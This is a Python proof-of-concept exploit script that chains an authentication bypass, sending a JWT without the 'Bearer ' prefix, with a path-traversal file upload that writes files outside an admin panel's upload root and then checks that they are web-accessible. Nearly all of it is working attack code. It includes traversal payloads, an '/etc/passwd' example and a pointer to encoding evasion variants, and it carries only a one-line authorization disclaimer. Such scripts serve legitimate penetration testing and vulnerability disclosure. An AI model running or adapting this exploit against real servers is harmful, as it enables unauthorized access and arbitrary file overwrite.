#!/usr/bin/env python3
"""
PoC: Authentication Bypass via Bearer Header Stripping
      + Arbitrary File Overwrite via Path Traversal

Usage:
    python3 poc.py --target https://admin.target.com --token <JWT>

IMPORTANT: Use only on systems you own or have written authorization to test.
"""

import argparse
import sys
import requests
import urllib.parse
from requests_toolbelt.multipart.encoder import MultipartEncoder

requests.packages.urllib3.disable_warnings()

# ─────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────
UPLOAD_PATH    = "/api/upload-resource"
TEST_ENDPOINT  = "/api/admin/dashboard"   # Any admin-only endpoint to confirm bypass
PROBE_CONTENT  = b"<html><body><h1>PoC: Path Traversal Write</h1></body></html>"
TRAVERSAL_PATHS = [
    "resource/../../web/build/poc_test.html",
    "resource/../../public/poc_test.html",
    "resource/../../../var/www/html/poc_test.html",
]


def check_auth_bypass(base_url: str, token: str, session: requests.Session) -> bool:
    """
    Test Step 1: Send the raw JWT without the 'Bearer ' prefix.
    Returns True if the server responds with 200 (bypass confirmed).
    """
    url = base_url.rstrip("/") + TEST_ENDPOINT
    print(f"\n[*] Testing Bearer header stripping on: {url}")

    # Baseline — no auth header (expect 401)
    r_noauth = session.get(url, headers={}, verify=False, timeout=10)
    print(f"    No auth header      → HTTP {r_noauth.status_code}")

    # Legitimate Bearer format (expect 200 if token is valid)
    r_bearer = session.get(url, headers={"Authorization": f"Bearer {token}"},
                           verify=False, timeout=10)
    print(f"    Bearer <token>      → HTTP {r_bearer.status_code}")

    # Bypass: raw token without 'Bearer ' prefix
    r_bypass = session.get(url, headers={"Authorization": token},
                           verify=False, timeout=10)
    print(f"    <token> (no Bearer) → HTTP {r_bypass.status_code}")

    if r_bypass.status_code == 200 and r_noauth.status_code in (401, 403):
        print("    [VULNERABLE] Auth bypass confirmed — server accepts token without 'Bearer ' prefix")
        return True
    else:
        print("    [NOT VULNERABLE] Server correctly rejects stripped header")
        return False


def test_path_traversal(base_url: str, token: str, session: requests.Session) -> list:
    """
    Test Steps 2+3: Attempt to write a file outside the upload root
    using path traversal sequences in the fullFilePath parameter.
    Returns list of successful traversal paths.
    """
    url = base_url.rstrip("/") + UPLOAD_PATH
    successful = []

    print(f"\n[*] Testing path traversal on upload endpoint: {url}")

    for raw_path in TRAVERSAL_PATHS:
        encoded_path = urllib.parse.quote(raw_path, safe="")
        full_url = (
            f"{url}?owner=built-in&user=admin"
            f"&fullFilePath={encoded_path}"
            f"&provider=provider_storage_local_file_system"
        )

        mp = MultipartEncoder(fields={
            "file": ("poc.html", PROBE_CONTENT, "text/html")
        })

        headers = {
            "Authorization": token,           # Use stripped token (bypass)
            "Content-Type": mp.content_type,
        }

        print(f"\n    Trying: {raw_path}")
        print(f"    Encoded: {encoded_path}")

        try:
            r = session.post(full_url, data=mp, headers=headers,
                             verify=False, timeout=15)
            print(f"    Response: HTTP {r.status_code}")

            if r.status_code in (200, 201):
                print(f"    [VULNERABLE] Server accepted traversal write → {raw_path}")
                successful.append(raw_path)
            elif r.status_code == 400:
                resp_text = r.text[:200]
                if "invalid" in resp_text.lower() or "path" in resp_text.lower():
                    print(f"    [FILTERED] Server rejected path: {resp_text}")
                else:
                    print(f"    [UNKNOWN 400] Response: {resp_text}")
            elif r.status_code in (401, 403):
                print(f"    [AUTH FAILED] Auth bypass may not apply to upload endpoint")
            else:
                print(f"    Response body: {r.text[:200]}")
        except requests.exceptions.RequestException as e:
            print(f"    [ERROR] Request failed: {e}")

    return successful


def verify_write(base_url: str, session: requests.Session,
                 traversal_path: str) -> bool:
    """
    Verify that the file was actually written by fetching it via HTTP.
    Assumes the traversal target is web-accessible.
    """
    parts = traversal_path.split("/")
    depth = parts.count("..")
    web_parts = parts[depth + 1:]
    web_path = "/" + "/".join(web_parts)

    verify_url = base_url.rstrip("/") + web_path
    print(f"\n[*] Verifying file write at: {verify_url}")

    try:
        r = session.get(verify_url, verify=False, timeout=10)
        if r.status_code == 200 and b"PoC" in r.content:
            print(f"    [CONFIRMED] File is web-accessible and contains PoC content!")
            print(f"    Impact: Arbitrary file overwrite at {web_path}")
            return True
        else:
            print(f"    HTTP {r.status_code} — file may exist but not web-accessible, "
                  "or path mapping differs")
    except requests.exceptions.RequestException as e:
        print(f"    [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC: Auth Bypass via Bearer Header Stripping + Path Traversal File Overwrite"
    )
    parser.add_argument("--target", required=True,
                        help="Base URL of the admin panel (e.g. https://admin.target.com)")
    parser.add_argument("--token", required=True,
                        help="Valid JWT token (without 'Bearer ' prefix)")
    parser.add_argument("--upload-path", default=UPLOAD_PATH,
                        help=f"Upload API path (default: {UPLOAD_PATH})")
    parser.add_argument("--custom-traversal",
                        help="Custom traversal path to test (e.g. 'resource/../../etc/passwd')")
    args = parser.parse_args()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security Research PoC)"})

    print("=" * 60)
    print("  Auth Bypass + File Overwrite PoC")
    print(f"  Target: {args.target}")
    print("=" * 60)

    # --- Phase 1: Auth Bypass ---
    bypassed = check_auth_bypass(args.target, args.token, session)
    if not bypassed:
        print("\n[!] Auth bypass failed. Continuing to test upload endpoint "
              "with legitimate Bearer token anyway...")

    # --- Phase 2: Path Traversal ---
    paths = list(TRAVERSAL_PATHS)
    if args.custom_traversal:
        paths.insert(0, args.custom_traversal)

    successful = test_path_traversal(args.target, args.token, session)

    # --- Phase 3: Verification ---
    if successful:
        print(f"\n[+] {len(successful)} traversal path(s) succeeded. Verifying...")
        for path in successful:
            verify_write(args.target, session, path)
    else:
        print("\n[-] No successful path traversal writes detected.")
        print("    → Try encoding variants (see references/evasion.md)")

    # --- Summary ---
    print("\n" + "=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    print(f"  Auth bypass (header stripping): {'YES' if bypassed else 'NO'}")
    print(f"  Path traversal writes:          {len(successful)} path(s)")
    if bypassed or successful:
        print("  [!] VULNERABILITY CONFIRMED — Report immediately")
    else:
        print("  No vulnerabilities confirmed with default payloads.")
        print("  Test encoding variants and custom paths manually.")


if __name__ == "__main__":
    main()
